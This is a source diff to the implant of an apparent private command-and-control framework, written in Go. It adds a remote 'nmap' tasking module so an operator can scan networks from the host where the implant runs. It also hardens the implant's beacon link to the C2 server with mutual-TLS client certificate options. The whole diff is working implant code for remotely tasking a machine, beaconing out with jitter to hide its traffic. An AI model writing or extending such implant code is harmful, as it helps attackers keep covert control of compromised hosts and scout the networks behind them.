@@ -21,6 +21,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/azizbinmohammad/private-c2/implant/modules/nmap"
 	"github.com/azizbinmohammad/private-c2/implant/modules/screenshot"
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
 	"github.com/azizbinmohammad/private-c2/pkg/protocol"
@@ -172,6 +173,11 @@ func handleTask(ctx context.Context, task protocol.TaskWire) (string, error) {
 		}
 		return base64.StdEncoding.EncodeToString(result), nil
 
+	case "nmap":
+		// Scans run on this host, so nmap has to be installed here. Empty args
+		// is the operator asking whether it is.
+		return nmap.Execute(ctx, task.Args)
+
 	default:
 		return "", fmt.Errorf("unknown task type: %s", task.Type)
 	}
@@ -216,7 +222,10 @@ func main() {
 	serverAddr := flag.String("server", "", "C2 server address (host:port)")
 	interval := flag.Duration("interval", 5*time.Second, "beacon interval")
 	jitter := flag.Float64("jitter", 0.3, "jitter factor (0-1)")
-	caPath := flag.String("ca", "", "path to CA cert PEM (optional, skips verification if empty)")
+	caPath := flag.String("ca", "", "path to CA cert PEM used to verify the server (required unless --insecure)")
+	certPath := flag.String("cert", "", "path to client certificate PEM presented to the server (required when the listener enforces mTLS)")
+	keyPath := flag.String("key", "", "path to client private key PEM")
+	insecure := flag.Bool("insecure", false, "skip server certificate verification (development only)")
 	flag.Parse()
 
 	if *serverAddr == "" {
@@ -224,7 +233,12 @@ func main() {
 		os.Exit(1)
 	}
 
-	tlsConfig, err := tlsutil.ClientTLSConfig(*caPath)
+	tlsConfig, err := tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
+		CAPath:   *caPath,
+		CertFile: *certPath,
+		KeyFile:  *keyPath,
+		Insecure: *insecure,
+	})
 	if err != nil {
 		log.Fatalf("tls config: %v", err)
 	}
